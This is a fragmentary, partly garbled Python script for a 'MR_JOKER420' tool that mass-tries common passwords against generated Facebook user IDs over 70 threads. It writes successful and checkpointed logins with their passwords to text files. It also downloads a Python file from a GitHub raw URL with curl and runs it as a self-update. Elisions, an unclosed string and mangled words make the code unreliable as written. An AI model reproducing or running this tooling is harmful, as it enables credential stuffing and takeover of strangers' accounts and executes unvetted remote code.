...
os.system('xdg-open http://wa.me/+937266012')
...
try:
    ...
    os.system('python MR_JOKER420.py')
import uuid
import os,sys,time,json,random,re,string,platform,base64
...
\__    _/(  ___  )| \    /\(  ____ \(  ____ )
   ...
   |  |  | |   | ||  ( \ \ | (      | (\ (   
|\_)  )  | (___) ||  /  \ \| (____/\| ) \ \__
(____/   (_______)|_/    \/(_______/|/   \__/
\33[1;37m----------------------------------------------
→   Owner      :  MR_JOKER420
→   Facebook   :  MR_JOKER420
→   Github     : MR_JOKER420
  →   Tools   :  MR_JOKER420 
...
cps = []
try:
    print('\n Not worMR_JOKER420 your device\n\033[1;37m Please Wait\033[0;97m\n congratulations worMR_JOKER420 your device ')
    proxy = requests.get('https://raw.githubusercontent.com/MR_JOKER420-JUTT/Ahmed/main/update.txt').text.splitlines()
    v = 3.1
    update = requests.get('https://raw.githubusercontent.com/MR_JOKER420-JUTT/files/main/version.txt').text
    if str(v) in update:
        os.system('rm -rf MR_JOKER420')
        os.system('curl -L https://raw.githubusercontent.com/MR_JOKER420-JUTT/MR_JOKER420/main/MR_JOKER420.py > MR_JOKER420.py')
        os.system('python MR_JOKER420.py')
    else:pass
...
def riaz():
	...
	if riaz1 =='5':
		riaz()
	if riaz1 =='4':
		os.system('xdg-open http://wa.me/+937266012?text=MR_JOKER420💜🐰Sir😪💕')
	if riaz1 =='3':
		os.system('xdg-open https://www.facebook.com/kanokwan.plengien');riaz()
	if riaz1 =='2':
		bangla()
	else:
		print('\n\033[1;31mChoose vMR_JOKER420d option\033[0;97m')
		riaz()
...
def annu():
    ...
    if riaz1 =='4':
        ...
        print('\n\033[1;37m[+] SELECT VMR_JOKER420D optION\033[0;97m')        
def bangla():
	os.system('clear')
	print(logo)
...
def m1():
    ...
    with ThreadPool(max_workers=70) as yaari:
        ...
        for guru in user:
            uid = kode+guru
            pwx=[guru+guru,'Afghan123','Afghanistan','afghan12345','kabul123','100200','۱۲۳۴۵۶۷','۵٠٠۶٠٠','500500]
...
def b1():
    ...
    with ThreadPool(max_workers=70) as yaari:
        ...
        for guru in user:
            uid = kode+guru
            pwx=[guru,kode,'pakistan','khankhan','khan123','mMR_JOKER420k123','Ahmad123']
            yaari.submit(rcrack,uid,pwx,tl)
    print(46*'-')
    print('IDZ SAVED IN OK.txt : CP.txt')
    print(46*'-')
...
def b2():
    ...
    with ThreadPool(max_workers=70) as yaari:
        ...
        for guru in user:
            uid = kode+guru
            pwx=[guru,'MMR_JOKER420K123','pakistan','khankhan','khan123','khan12345','123456','Ahmad123']
            yaari.submit(rcrack,uid,pwx,tl)
    print(46*'-')
    print('IDZ SAVED IN OK.txt : CP.txt')
    print(46*'-')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[MR_JOKER420-OK] '+cid+'|'+ps+'\033[0;97m')
                open('MR_JOKER420-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                print('\033[1;31m[MR_JOKER420-CP] '+uid+' | '+ps+'\x1b[1;97m')
                open('MR_JOKER420-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;97mMR_JOKER420\033[1;97m] %s|\33[1;32mOK:- %s \r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
